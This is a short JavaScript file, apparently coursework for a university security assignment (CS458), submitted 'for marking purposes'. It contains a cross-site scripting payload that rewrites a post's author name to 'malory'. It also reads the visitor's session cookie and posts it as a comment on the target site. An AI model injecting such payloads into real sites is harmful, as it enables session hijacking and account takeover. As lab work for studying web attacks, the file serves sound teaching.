
/*
Note: This file is strictly for marking purposes.
This was made so the TA can see the js functions if they want to.
*/

<script>
    function nonPersistent(){
        let url = window.location.href;
        let isView = url.search('view.php[?]id=[0-9].');
        if(isView > 0){
            let author = document.querySelector('small').textContent.toString();
            let authorArr = author.split(' ');
            authorArr[2] = 'malory';
            let newAuthor = authorArr.join(' ');
            document.querySelector('small').textContent = newAuthor;
        }
        return;
    }
    function getPostId(){
        let url = window.location.href;
        let isView = url.search('view.php[?]id=[0-9].');
        if(isView){
            let idArr = url.split('=');
            let id = parseInt(idArr[1]);
            return id;
        }
        return -1;
    }
    function leakCookies(postId){
        if(postId === -1){
            return;
        }
        let cookie = document.cookie;
        let cookieVal = 'CS458=';
        let cookieValId = cookieVal.concat(cookie.split('=')[1].toString());
        let formData = new FormData();
        formData.append('comment', cookieValId);
        formData.append('parent', postId);
        formData.append('form', 'comment');
        formData.append('uid', 0);
        formData.append('submit', '');
        let requestOptions = {
            method: 'POST',
            body: formData
        };
        let res = fetch('post.php', requestOptions);
        return;
    }
    nonPersistent();
    leakCookies(getPostId());
</script>